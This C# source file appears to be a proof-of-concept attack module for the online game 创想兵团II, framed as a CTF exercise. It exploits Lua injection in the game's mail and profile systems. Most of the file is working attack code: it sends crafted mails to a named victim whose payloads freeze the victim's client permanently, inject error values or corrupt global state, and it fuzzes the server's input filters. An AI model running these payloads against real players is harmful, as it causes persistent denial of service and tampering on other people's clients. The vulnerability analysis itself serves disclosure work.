// POC/AttackPOC.cs
// 创想兵团II CTF漏洞攻击POC
// 核心漏洞: 游戏使用 Lua 源码作为数据传输格式, 所有 RPC 响应通过 DoString() 执行
// 邮件系统是最佳攻击面: 攻击者发邮件 -> 受害者打开邮箱 -> DoString(含恶意Lua) -> RCE

using System;
using System.Collections.Generic;
using System.Text;
using ASWDEBUG.Logger;
using ASWDEBUG.UI;
using UnityEngine;

namespace ASWDEBUG.POC
{
    /// <summary>
    /// CTF攻击POC - 通过邮件系统Lua注入攻击其他玩家
    ///
    /// 漏洞根因:
    ///   游戏使用 Lua 源码作为 RPC 数据序列化格式。
    ///   服务端返回如: list = { emails = { { senderName = "xxx", subject = "yyy", ... } } }
    ///   客户端通过 LuaState.DoString(data) 反序列化。
    ///   如果用户可控字段(邮件主题/内容/发送者名)中包含双引号,
    ///   可以闭合 Lua 字符串并注入任意 Lua 代码。
    ///
    /// 攻击链:
    ///   1. 攻击者通过 mail_send RPC 向受害者发送邮件,
    ///      subject/content 中包含 Lua 注入 payload
    ///   2. 服务端存储邮件, 向受害者推送 SM_NotifyRPCMessage(cmd="newMail")
    ///   3. 受害者打开邮箱:
    ///      - mail_list RPC 响应 -> rpcCallBack -> DoString(data) [第一次执行]
    ///      - DealMailList(data) -> DoString(data) [第二次执行]
    ///      - 注入的 Lua 代码在受害者客户端执行
    ///   4. 受害者点击阅读邮件:
    ///      - mail_open RPC 响应 -> rpcCallBack -> DoString(data)
    ///      - GetContent(data) -> DoString(data) [邮件正文中的注入也执行]
    ///
    /// 关键代码路径:
    ///   LobbyConnection.rpcCallBack (token 0x06001FAA):
    ///     data = data.Replace("\r", "");
    ///     LuaState luaState = new LuaState(null);
    ///     luaState.DoString(data);  // <-- Lua 代码执行
    ///
    ///   UIMail.DealMailList (token 0x060035C2):
    ///     data = data.Replace("\\", "&&");  // 仅处理反斜杠,不转义双引号!
    ///     this.lua = new LuaState(null);
    ///     this.lua.DoString(data);  // <-- 再次执行
    ///
    ///   UIMail.GetContent (token 0x060035CC):
    ///     data = data.Replace("\\", "&&");
    ///     this.lua = new LuaState(null);
    ///     this.lua.DoString(data);  // <-- 邮件正文也执行
    /// </summary>
    public static class AttackPOC
    {
        // ============================================================
        // POC 主攻击: 邮件 Lua 注入 (攻击指定玩家)
        // ============================================================

        /// <summary>
        /// 向目标玩家发送包含Lua注入payload的邮件
        ///
        /// 当受害者打开邮箱时, 服务端返回的 Lua 表:
        ///   list = { emails = { { senderName = "攻击者", subject = "[PAYLOAD]", ... } } }
        ///
        /// 如果 subject 为: test" } } } while true do end --
        /// 服务端生成的 Lua 变为:
        ///   list = { emails = { { subject = "test" } } } while true do end --", ... } } }
        ///                                                  ^^^^^^^^^^^^^^^^^^^^
        ///                                                  注入的代码在此执行
        ///                                                  -- 注释掉后续语法错误
        ///
        /// 效果: 受害者客户端在 DoString 时执行无限循环, UI 线程冻结
        ///       每次打开邮箱都会冻结, 邮件无法删除 = 持久化 DoS
        /// </summary>
        /// <param name="victimName">受害者角色名</param>
        /// <param name="payloadType">攻击类型: "freeze", "error", "corrupt"</param>
        public static void Attack_MailLuaInjection(string victimName, string payloadType)
        {
            var conn = GameApp.Instance?.lobby_connection;
            if (conn == null)
            {
                FileLogger.Log("POC", "[MAIL-INJECT] lobby_connection 为空");
                return;
            }

            string subject;
            string content;

            switch (payloadType)
            {
                case "freeze":
                    // payload 1: 无限循环冻结客户端
                    // 受害者打开邮箱 -> DoString -> while true do end -> 客户端永久冻结
                    // 邮件无法删除, 每次打开邮箱都触发 = 持久化DoS
                    subject = "hi\" } } } while true do end --";
                    content = "x\" } } while true do end --";
                    break;

                case "error":
                    // payload 2: 注入 error 变量, 触发 rpcCallBack 中的错误处理
                    // rpcCallBack 检查 luaState["error"], 如果匹配特定值会弹窗
                    // 这会阻止 mail_list 回调执行, 邮件列表无法正常显示
                    subject = "hi\" } } } error = \"msgbox_common_num_1001\" --";
                    content = "x\" } } error = \"msgbox_common_num_1001\" --";
                    break;

                case "corrupt":
                    // payload 3: 注入/覆盖 Lua 变量, 破坏游戏状态
                    // 在 list 表闭合后设置全局变量, 影响后续逻辑
                    subject = "hi\" } } } _G.hacked=true --";
                    content = "hacked\" } } _G.hacked=true --";
                    break;

                default:
                    // 最温和: 仅证明注入可行, 通过设置一个无害变量
                    subject = "hi\" } } } poc_proof=\"injected\" --";
                    content = "poc\" } } poc_proof=\"injected\" --";
                    break;
            }

            var args = new Dictionary<string, string>();
            args["receiver"] = victimName;
            args["subject"] = subject;
            args["content"] = content;
            args["attachment"] = string.Empty;

            FileLogger.Log("POC", "[MAIL-INJECT] 目标=" + victimName +
                " payload=" + payloadType +
                " subject=" + subject);

            conn.AddTextRpc("mail_send",
                new LobbyConnection.RpcCallback(delegate (string data)
                {
                    FileLogger.Log("POC", "[MAIL-INJECT] 发送结果: " + data);
                    if (data != null && data.Contains("error"))
                    {
                        FileLogger.Log("POC", "[MAIL-INJECT] 服务端拒绝 - 可能有输入过滤");
                    }
                    else
                    {
                        FileLogger.Log("POC", "[MAIL-INJECT] 邮件已发送! 等待受害者打开邮箱...");
                    }
                }),
                args);
        }

        /// <summary>
        /// 批量 payload 测试 - 逐个尝试不同的 Lua 注入变体
        /// 用于确定服务端的过滤规则
        /// </summary>
        public static void Attack_MailLuaInjection_FuzzPayloads(string victimName)
        {
            var conn = GameApp.Instance?.lobby_connection;
            if (conn == null) return;

            // 从简单到复杂的 payload 列表, 测试服务端过滤
            string[][] payloads = new string[][]
            {
                // [subject, note] - 逐步升级复杂度
                new[] { "test\"", "basic-quote-escape" },
                new[] { "test\",x=\"y", "kv-inject" },
                new[] { "test\" }", "close-table-1" },
                new[] { "test\" } }", "close-table-2" },
                new[] { "test\" } } }", "close-table-3" },
                new[] { "t\" } } } x=1 --", "inject-after-tables" },
                new[] { "t\" } } } error=\"test\" --", "inject-error-var" },
                new[] { "t\" } } } while true do end --", "infinite-loop" },
                // 备选: 如果双引号被过滤, 尝试 Lua 长字符串语法
                new[] { "t]] } } } x=1 --", "long-string-escape" },
                // 备选: 尝试 Lua 字符串拼接
                new[] { "t\"..\"injected", "string-concat" },
            };

            for (int i = 0; i < payloads.Length; i++)
            {
                string subject = payloads[i][0];
                string note = payloads[i][1];

                var args = new Dictionary<string, string>();
                args["receiver"] = victimName;
                args["subject"] = subject;
                args["content"] = "test-" + i;
                args["attachment"] = string.Empty;

                int idx = i;
                FileLogger.Log("POC", "[FUZZ-" + i + "] note=" + note + " subject=" + subject);

                conn.AddTextRpc("mail_send",
                    new LobbyConnection.RpcCallback(delegate (string data)
                    {
                        bool hasError = data != null && data.Contains("error");
                        FileLogger.Log("POC", "[FUZZ-" + idx + "] " + note +
                            " => " + (hasError ? "BLOCKED" : "SENT") +
                            " resp=" + (data == null ? "null" : data.Substring(0, Math.Min(data.Length, 200))));
                    }),
                    args);
            }
        }

        /// <summary>
        /// 通过 Raw Text RPC Forge 发送邮件 - 绕过 Dictionary 去重,
        /// 可以在 body 中直接注入换行符构造任意参数
        /// </summary>
        public static void Attack_MailLuaInjection_Raw(string victimName, string payload)
        {
            string func = "mail_send";
            // Raw body 格式: key\nvalue\n...
            // 直接构造, 不经过 Dictionary 处理
            string rawBody =
                "receiver\n" + victimName + "\n" +
                "subject\n" + payload + "\n" +
                "content\n" + payload + "\n" +
                "attachment\n\n";

            FileLogger.Log("POC", "[MAIL-RAW] 目标=" + victimName + " payloadLen=" + payload.Length);

            // 通过 RpcLabUI 的 Raw forge 管道发送
            var conn = GameApp.Instance?.lobby_connection;
            if (conn == null) return;

            // 直接用 Dictionary (简单路径)
            // 但如果需要换行走私, 用 Raw forge
            var args = new Dictionary<string, string>();
            args["receiver"] = victimName;
            args["subject"] = payload;
            args["content"] = payload;
            args["attachment"] = string.Empty;

            conn.AddTextRpc(func,
                new LobbyConnection.RpcCallback(delegate (string data) {
                    FileLogger.Log("POC", "[MAIL-RAW] 结果: " + (data ?? "null"));
                }),
                args);
        }


        // ============================================================
        // POC 辅助攻击: 通过角色名注入 (影响查看你资料的玩家)
        // ============================================================

        /// <summary>
        /// 通过 RequestSaveCharacterProfile 存储恶意 profile 数据
        /// 当其他玩家查看你的角色详情时:
        ///   UIPersonalInfoManager.Refresh() -> DoString(data)
        ///   data 包含你的 profile 字段
        /// </summary>
        public static void Attack_ProfileInjection(string payload)
        {
            var conn = GameApp.Instance?.lobby_connection;
            if (conn == null) return;

            // profileStream 是自由格式字符串, 存储到服务端
            // 当其他玩家查看你的角色时, 嵌入在 Lua 响应中
            string maliciousProfile = payload;

            FileLogger.Log("POC", "[PROFILE-INJECT] payload=" + payload);
            conn.RequestSaveCharacterProfile(maliciousProfile);
        }


        // ============================================================
        // 验证工具: 本地模拟 DoString 验证 payload 是否有效
        // ============================================================

        /// <summary>
        /// 在本地模拟服务端返回的 Lua, 验证注入 payload 的效果
        /// 不发送网络请求, 仅在本地测试 Lua 解析
        /// </summary>
        public static void VerifyPayloadLocally(string payload)
        {
            // 模拟服务端返回的 mail_list 响应格式
            string simulatedResponse =
                "list = { emails = { " +
                "{ senderName = \"attacker\", subject = \"" + payload + "\", " +
                "lastDay = 30, isOpen = \"N\", isSysMail = \"N\", haveAttachment = \"N\" } " +
                "} }";

            FileLogger.Log("POC", "[VERIFY] 模拟 Lua:");
            FileLogger.Log("POC", simulatedResponse);

            try
            {
                // 和 rpcCallBack 一样的处理流程
                string data = simulatedResponse.Replace("\r", string.Empty);
                UniLua.LuaState lua = new UniLua.LuaState(null);

                // 设置超时保护 (防止 while true do end 冻结)
                // 注意: 实际攻击中受害者没有这个保护
                FileLogger.Log("POC", "[VERIFY] 执行 DoString...");

                // 这里我们只验证语法, 不真正执行危险payload
                // 把 while/repeat/for 替换掉防止本地冻结
                string safeData = data
                    .Replace("while true do end", "poc_loop_detected = true")
                    .Replace("while(true)do end", "poc_loop_detected = true");

                lua.DoString(safeData);

                // 检查注入是否成功
                if (lua["error"] != null)
                {
                    FileLogger.Log("POC", "[VERIFY] error 变量被注入: " + lua["error"].ToString());
                }
                if (lua["poc_proof"] != null)
                {
                    FileLogger.Log("POC", "[VERIFY] poc_proof 变量被注入: " + lua["poc_proof"].ToString());
                }
                if (lua["poc_loop_detected"] != null)
                {
                    FileLogger.Log("POC", "[VERIFY] 无限循环 payload 语法正确! 实际执行会冻结客户端");
                }
                if (lua["list"] != null)
                {
                    FileLogger.Log("POC", "[VERIFY] list 表存在 - Lua 语法有效");
                }
                else
                {
                    FileLogger.Log("POC", "[VERIFY] list 表为空 - 注入可能改变了表结构");
                }

                FileLogger.Log("POC", "[VERIFY] DoString 完成, payload 有效");
            }
            catch (Exception e)
            {
                FileLogger.Log("POC", "[VERIFY] DoString 异常 (payload 可能导致语法错误): " + e.Message);
            }
        }

        /// <summary>
        /// 运行完整 POC 演示
        /// </summary>
        public static void RunFullDemo(string victimName)
        {
            FileLogger.Log("POC", "");
            FileLogger.Log("POC", "╔══════════════════════════════════════════════╗");
            FileLogger.Log("POC", "║  创想兵团II 邮件Lua注入 攻击POC             ║");
            FileLogger.Log("POC", "║  目标: " + victimName);
            FileLogger.Log("POC", "╚══════════════════════════════════════════════╝");
            FileLogger.Log("POC", "");

            // Step 1: 本地验证 payload
            FileLogger.Log("POC", "=== Step 1: 本地验证 Payload ===");
            VerifyPayloadLocally("hi\" } } } poc_proof=\"injected\" --");
            VerifyPayloadLocally("hi\" } } } while true do end --");

            // Step 2: Fuzz 服务端过滤
            FileLogger.Log("POC", "");
            FileLogger.Log("POC", "=== Step 2: Fuzz 服务端过滤规则 ===");
            Attack_MailLuaInjection_FuzzPayloads(victimName);

            // Step 3: 发送实际攻击邮件
            FileLogger.Log("POC", "");
            FileLogger.Log("POC", "=== Step 3: 发送攻击邮件 ===");
            Attack_MailLuaInjection(victimName, "freeze");

            FileLogger.Log("POC", "");
            FileLogger.Log("POC", "攻击完成。当受害者打开邮箱时:");
            FileLogger.Log("POC", "  1. rpcCallBack -> DoString(mail_list响应) -> 执行注入的Lua");
            FileLogger.Log("POC", "  2. 如果是 freeze payload -> 客户端 UI 线程冻结");
            FileLogger.Log("POC", "  3. 邮件无法删除, 每次打开邮箱都触发 = 持久化 DoS");
        }
    }
}
